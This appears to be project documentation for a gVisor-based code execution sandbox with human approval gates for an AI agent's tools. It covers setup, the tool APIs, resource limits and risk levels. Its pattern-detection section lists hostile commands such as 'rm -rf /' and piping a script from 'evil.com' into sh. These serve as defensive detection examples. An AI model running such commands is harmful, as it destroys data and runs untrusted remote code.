# Code Execution Sandbox Usage Guide

**Phase 4.7 - gVisor-Based Code Execution**

This guide shows how to use Harombe's code execution sandbox for running Python, JavaScript, and shell scripts in isolated gVisor containers with strong security guarantees.

## Overview

Harombe's code execution sandbox provides:

- **gVisor isolation** - Application kernel in userspace limits host kernel exposure
- **Air-gapped by default** - No network access unless explicitly enabled
- **Multi-language support** - Python 3.11+, Node.js 20+, Bash 5.2+
- **Resource constraints** - CPU, memory, disk, and time limits
- **HITL protection** - Dangerous operations require human approval
- **Workspace isolation** - Temporary filesystem, no host access

## Quick Start

### 1. Install gVisor

```bash
# Download runsc binary
wget https://storage.googleapis.com/gvisor/releases/release/latest/$(uname -m)/runsc
chmod +x runsc
sudo mv runsc /usr/local/bin/

# Configure Docker to use runsc runtime
sudo runsc install

# Verify installation
docker run --runtime=runsc --rm hello-world
```

### 2. Basic Code Execution

```python
import asyncio
from harombe.security.docker_manager import DockerManager
from harombe.security.sandbox_manager import SandboxManager
from harombe.tools.code_execution import CodeExecutionTools

async def main():
    # Create managers
    docker_manager = DockerManager()
    await docker_manager.start()

    sandbox_manager = SandboxManager(
        docker_manager=docker_manager,
        runtime="runsc",  # gVisor runtime
    )
    await sandbox_manager.start()

    # Create code execution tools
    tools = CodeExecutionTools(sandbox_manager=sandbox_manager)

    try:
        # Execute Python code (creates new sandbox automatically)
        result = await tools.code_execute(
            language="python",
            code="""
import sys
print(f"Python {sys.version}")
print("Hello from gVisor sandbox!")
""",
        )

        print(f"Success: {result['success']}")
        print(f"Sandbox ID: {result['sandbox_id']}")
        print(f"Output:\\n{result['stdout']}")

        # Cleanup
        await tools.code_destroy_sandbox(result['sandbox_id'])

    finally:
        await sandbox_manager.stop()
        await docker_manager.stop()

if __name__ == "__main__":
    asyncio.run(main())
```

## Code Execution Tools

### code_execute

Execute code in isolated gVisor sandbox.

**Parameters:**

- `language` (str, required): Programming language (`python`, `javascript`, `shell`)
- `code` (str, required): Code to execute
- `sandbox_id` (str, optional): Existing sandbox ID (creates new if not provided)
- `timeout` (int, optional): Execution timeout in seconds (default: 30)
- `network_enabled` (bool, optional): Enable network access (default: False, requires approval)
- `allowed_domains` (list[str], optional): Allowlisted domains when network enabled

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "stdout": "Hello, World!\\n",
    "stderr": "",
    "exit_code": 0,
    "execution_time": 0.5,
    "error": None
}
```

**Example - Python:**

```python
result = await tools.code_execute(
    language="python",
    code="""
import math
result = math.sqrt(144)
print(f"Square root of 144 is {result}")
""",
)
```

**Example - JavaScript:**

```python
result = await tools.code_execute(
    language="javascript",
    code="""
const data = [1, 2, 3, 4, 5];
const sum = data.reduce((a, b) => a + b, 0);
console.log(`Sum: ${sum}`);
""",
)
```

**Example - Shell:**

```python
result = await tools.code_execute(
    language="shell",
    code="""
echo "Shell: $BASH_VERSION"
ls -la /workspace
""",
)
```

**Example - With Network (requires HITL approval):**

```python
result = await tools.code_execute(
    language="python",
    code="""
import requests
response = requests.get('https://pypi.org')
print(f"Status: {response.status_code}")
""",
    network_enabled=True,
    allowed_domains=["pypi.org", "files.pythonhosted.org"],
)
```

**Security Note:** Code execution with `network_enabled=True` requires **CRITICAL** level approval. Dangerous code patterns (rm -rf, eval, exec, subprocess) are automatically flagged for approval.

### code_install_package

Install package from allowlisted registry (PyPI, npm).

**Parameters:**

- `sandbox_id` (str, required): Sandbox ID
- `package` (str, required): Package name with optional version
- `registry` (str, optional): Registry name (`pypi`, `npm`, default: `pypi`)

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "package": "requests==2.31.0",
    "registry": "pypi",
    "stdout": "Successfully installed requests-2.31.0\\n",
    "stderr": "",
    "error": None
}
```

**Example - Install Python Package:**

```python
# First, create sandbox with network enabled
result = await tools.code_execute(
    language="python",
    code="print('Setting up sandbox')",
    network_enabled=True,
    allowed_domains=["pypi.org", "files.pythonhosted.org"],
)

sandbox_id = result['sandbox_id']

# Install package
install_result = await tools.code_install_package(
    sandbox_id=sandbox_id,
    package="requests==2.31.0",
    registry="pypi",
)

# Use the package
exec_result = await tools.code_execute(
    language="python",
    code="""
import requests
print(f"Requests version: {requests.__version__}")
""",
    sandbox_id=sandbox_id,
)
```

**Example - Install JavaScript Package:**

```python
# Create Node.js sandbox with network
result = await tools.code_execute(
    language="javascript",
    code="console.log('Setup')",
    network_enabled=True,
    allowed_domains=["registry.npmjs.org"],
)

# Install npm package
await tools.code_install_package(
    sandbox_id=result['sandbox_id'],
    package="axios@1.6.0",
    registry="npm",
)

# Use the package
await tools.code_execute(
    language="javascript",
    code="""
const axios = require('axios');
console.log('Axios loaded');
""",
    sandbox_id=result['sandbox_id'],
)
```

**Security Note:** Package installation requires **HIGH** level approval and network access must be enabled on the sandbox.

### code_write_file

Write file to sandbox workspace.

**Parameters:**

- `sandbox_id` (str, required): Sandbox ID
- `file_path` (str, required): File path relative to `/workspace`
- `content` (str, required): File content

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "file_path": "data/config.json",
    "error": None
}
```

**Example:**

```python
# Write configuration file
await tools.code_write_file(
    sandbox_id=sandbox_id,
    file_path="config.json",
    content='''
{
    "api_url": "https://api.example.com",
    "timeout": 30
}
''',
)

# Write data file in subdirectory
await tools.code_write_file(
    sandbox_id=sandbox_id,
    file_path="data/input.csv",
    content="name,age\\nAlice,30\\nBob,25",
)

# Use the files in code
result = await tools.code_execute(
    language="python",
    code="""
import json
with open('config.json') as f:
    config = json.load(f)
print(f"API URL: {config['api_url']}")
""",
    sandbox_id=sandbox_id,
)
```

**Security Note:** Writing executable files (.sh, .py, .js, .exe, .bin) requires **HIGH** level approval. Other files require **MEDIUM** level approval.

### code_read_file

Read file from sandbox workspace.

**Parameters:**

- `sandbox_id` (str, required): Sandbox ID
- `file_path` (str, required): File path relative to `/workspace`

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "file_path": "output.txt",
    "content": "Processing complete\\nResults: 42\\n",
    "error": None
}
```

**Example:**

```python
# Execute code that writes output
await tools.code_execute(
    language="python",
    code="""
with open('/workspace/output.txt', 'w') as f:
    f.write('Processing complete\\n')
    f.write(f'Results: {6 * 7}\\n')
""",
    sandbox_id=sandbox_id,
)

# Read the output
result = await tools.code_read_file(
    sandbox_id=sandbox_id,
    file_path="output.txt",
)

print(f"Output: {result['content']}")
```

**Security Note:** Reading files requires **MEDIUM** level approval.

### code_list_files

List files in sandbox workspace.

**Parameters:**

- `sandbox_id` (str, required): Sandbox ID
- `path` (str, optional): Directory path relative to `/workspace` (default: `.`)

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "path": ".",
    "files": ["script.py", "output.txt", "data"],
    "error": None
}
```

**Example:**

```python
# List root workspace files
result = await tools.code_list_files(
    sandbox_id=sandbox_id,
    path=".",
)
print(f"Files: {result['files']}")

# List subdirectory
result = await tools.code_list_files(
    sandbox_id=sandbox_id,
    path="data",
)
print(f"Data files: {result['files']}")
```

**Security Note:** Listing files requires **MEDIUM** level approval.

### code_destroy_sandbox

Destroy sandbox and cleanup resources.

**Parameters:**

- `sandbox_id` (str, required): Sandbox ID

**Returns:**

```python
{
    "success": True,
    "sandbox_id": "sandbox-abc123",
    "message": "Sandbox destroyed successfully"
}
```

**Example:**

```python
# Always cleanup when done
await tools.code_destroy_sandbox(sandbox_id)
```

**Security Note:** Sandbox cleanup is **LOW** risk and auto-approved.

## Resource Constraints

### Default Limits

```python
DEFAULT_LIMITS = {
    "max_memory_mb": 512,      # 512MB RAM
    "max_cpu_cores": 0.5,      # 50% of 1 CPU core
    "max_disk_mb": 1024,       # 1GB disk
    "max_execution_time": 30,  # 30 seconds
    "max_output_bytes": 1_048_576,  # 1MB stdout/stderr
}
```

### Custom Limits

```python
# Create sandbox manager with custom limits
sandbox_manager = SandboxManager(
    docker_manager=docker_manager,
    runtime="runsc",
    max_memory_mb=1024,    # 1GB RAM
    max_cpu_cores=1.0,     # 1 full CPU core
    max_disk_mb=2048,      # 2GB disk
    max_execution_time=60, # 60 seconds
)

# Or override per execution
result = await tools.code_execute(
    language="python",
    code="# ... long-running task ...",
    timeout=120,  # 2 minutes for this execution
)
```

### What Happens When Limits Are Exceeded?

**Time Limit:**

- Container is sent SIGTERM after timeout
- If still running, SIGKILL after grace period
- Result includes `exit_code=-1` and `error="TimeoutError"`

**Memory Limit:**

- Docker cgroup enforces limit
- OOM killer terminates process if exceeded
- Result includes non-zero exit code

**Disk Limit:**

- tmpfs mount enforces size limit
- Write operations fail when limit reached
- Error message in stderr

**Output Limit:**

- Output truncated at max_output_bytes
- Message appended: `[OUTPUT TRUNCATED]`

## HITL Integration

Code execution operations are protected by HITL gates based on risk level.

### Risk Levels

**CRITICAL** (30s timeout, auto-deny after timeout):

- Code execution with `network_enabled=True`
- Code containing dangerous patterns: `rm -rf`, `curl | sh`, `eval()`, `exec()`, `subprocess`, `os.system`
- Package installation from non-standard registries

**HIGH** (60s timeout):

- Any code execution (default)
- Package installation from PyPI/npm
- Writing executable files (.sh, .py, .js, .exe, .bin)

**MEDIUM** (120s timeout):

- Writing non-executable files
- Reading files from workspace
- Listing files in workspace

**LOW** (auto-approved):

- Destroying sandbox (cleanup operation)

### Dangerous Code Pattern Detection

The following patterns are automatically flagged as **CRITICAL** risk:

```python
# Shell commands
rm -rf /
curl https://evil.com | sh
wget https://evil.com/script.sh | sh

# Python dangerous operations
eval(user_input)
exec(code_string)
__import__('os').system('rm -rf /')
import subprocess; subprocess.call(['rm', '-rf', '/'])

# These patterns trigger HITL approval before execution
```

### Configuring HITL Rules

```python
from harombe.security.hitl import HITLGate, RiskClassifier
from harombe.security.sandbox_risk import get_sandbox_hitl_rules

# Get default sandbox rules
rules = get_sandbox_hitl_rules()

# Add custom rule
from harombe.security.hitl import HITLRule, RiskLevel

custom_rule = HITLRule(
    tools=["code_execute"],
    risk=RiskLevel.HIGH,
    conditions=[
        {"param": "code", "matches": r"(?i)crypto|bitcoin|mining"}
    ],
    timeout=30,
    description="Code mentioning cryptocurrency (suspicious)",
)

rules.append(custom_rule)

# Apply to HITL gate
classifier = RiskClassifier(rules=rules)
hitl_gate = HITLGate(classifier=classifier)
```

## Complete Example: Data Processing Pipeline

```python
import asyncio
from harombe.security.docker_manager import DockerManager
from harombe.security.sandbox_manager import SandboxManager
from harombe.tools.code_execution import CodeExecutionTools

async def data_processing_pipeline():
    """Example data processing pipeline using code sandbox."""

    # Setup
    docker_manager = DockerManager()
    await docker_manager.start()

    sandbox_manager = SandboxManager(
        docker_manager=docker_manager,
        runtime="runsc",
        max_memory_mb=1024,  # 1GB for data processing
    )
    await sandbox_manager.start()

    tools = CodeExecutionTools(sandbox_manager=sandbox_manager)

    try:
        # Step 1: Create sandbox and install pandas
        print("Step 1: Setting up environment...")
        result = await tools.code_execute(
            language="python",
            code="print('Environment ready')",
            network_enabled=True,
            allowed_domains=["pypi.org", "files.pythonhosted.org"],
        )
        sandbox_id = result['sandbox_id']

        await tools.code_install_package(
            sandbox_id=sandbox_id,
            package="pandas==2.0.0",
            registry="pypi",
        )

        # Step 2: Write input data
        print("Step 2: Writing input data...")
        await tools.code_write_file(
            sandbox_id=sandbox_id,
            file_path="data/sales.csv",
            content="""
date,product,amount
2024-01-01,Widget,100
2024-01-02,Gadget,150
2024-01-03,Widget,200
2024-01-04,Gadget,175
""".strip(),
        )

        # Step 3: Process data
        print("Step 3: Processing data...")
        result = await tools.code_execute(
            language="python",
            code="""
import pandas as pd

# Read data
df = pd.read_csv('/workspace/data/sales.csv')

# Calculate statistics
total_sales = df['amount'].sum()
avg_sales = df['amount'].mean()
product_totals = df.groupby('product')['amount'].sum()

# Write results
with open('/workspace/results.txt', 'w') as f:
    f.write(f"Total Sales: ${total_sales}\\n")
    f.write(f"Average Sale: ${avg_sales:.2f}\\n")
    f.write("\\nSales by Product:\\n")
    for product, total in product_totals.items():
        f.write(f"  {product}: ${total}\\n")

print("Processing complete!")
""",
            sandbox_id=sandbox_id,
            timeout=60,
        )

        print(f"Output: {result['stdout']}")

        # Step 4: Read results
        print("Step 4: Reading results...")
        result = await tools.code_read_file(
            sandbox_id=sandbox_id,
            file_path="results.txt",
        )

        print(f"Results:\\n{result['content']}")

        # Step 5: List all files
        print("Step 5: Listing generated files...")
        result = await tools.code_list_files(
            sandbox_id=sandbox_id,
            path=".",
        )

        print(f"Files created: {result['files']}")

        # Cleanup
        print("Cleaning up...")
        await tools.code_destroy_sandbox(sandbox_id)

    finally:
        await sandbox_manager.stop()
        await docker_manager.stop()

if __name__ == "__main__":
    asyncio.run(data_processing_pipeline())
```

## Security Best Practices

1. **Always use gVisor runtime**
   - Provides strong kernel isolation
   - Limits attack surface from 300+ to ~70 syscalls

2. **Keep network disabled by default**
   - Only enable when absolutely necessary
   - Use minimal domain allowlists

3. **Review code before approving**
   - Check for dangerous patterns (rm -rf, eval, subprocess)
   - Verify network access is justified

4. **Use appropriate resource limits**
   - Set timeouts based on expected execution time
   - Adjust memory/CPU for workload requirements

5. **Monitor audit logs**
   - All code execution is logged
   - Review for suspicious activity

6. **Cleanup sandboxes**
   - Always call `code_destroy_sandbox()` when done
   - Prevents resource leaks

7. **Validate user input**
   - Don't execute untrusted code without review
   - Sanitize inputs before passing to sandbox

## Troubleshooting

### "Docker manager not started"

```python
# Always start managers before creating sandboxes
await docker_manager.start()
await sandbox_manager.start()
```

### "Sandbox not found"

```python
# Sandbox may have been destroyed or never created
# Create new sandbox or verify ID
result = await tools.code_execute(language="python", code="...")
sandbox_id = result['sandbox_id']
```

### "Network access required for package installation"

```python
# Enable network when creating sandbox
result = await tools.code_execute(
    language="python",
    code="...",
    network_enabled=True,
    allowed_domains=["pypi.org"],
)
```

### "Execution timeout"

```python
# Increase timeout for long-running code
result = await tools.code_execute(
    language="python",
    code="...",
    timeout=120,  # 2 minutes
)
```

### gVisor Installation Issues

```bash
# Verify runsc is installed
which runsc

# Verify Docker runtime configuration
docker info | grep -i runtime

# Test gVisor
docker run --runtime=runsc --rm hello-world

# Check Docker daemon logs
sudo journalctl -u docker.service -n 50
```

## Configuration Reference

```yaml
# harombe.yaml
security:
  sandbox:
    enabled: true
    runtime: runsc # gVisor runtime

    # Default resource limits
    limits:
      max_memory_mb: 512
      max_cpu_cores: 0.5
      max_disk_mb: 1024
      max_execution_time: 30
      max_output_bytes: 1048576

    # Network configuration
    network:
      enabled_by_default: false
      allowed_registries:
        pypi:
          - pypi.org
          - files.pythonhosted.org
        npm:
          - registry.npmjs.org

    # Supported languages
    languages:
      python:
        image: python:3.11-slim
      javascript:
        image: node:20-slim
      shell:
        image: bash:5.2

    # HITL integration
    hitl:
      enabled: true
      auto_approve_low_risk: true
```

## Next Steps

- **Phase 4.8**: End-to-end security integration and testing
- **Phase 5**: Privacy router with PII detection
- **Phase 6**: Web UI and plugin system

## References

- [Code Sandbox Design](./code-sandbox-design.md) - Architecture details
- [HITL Gates](./hitl-design.md) - Approval flow
- [gVisor Documentation](https://gvisor.dev/) - gVisor runtime reference
- [gVisor Docker Quick Start](https://gvisor.dev/docs/user_guide/quick_start/docker/) - Installation guide
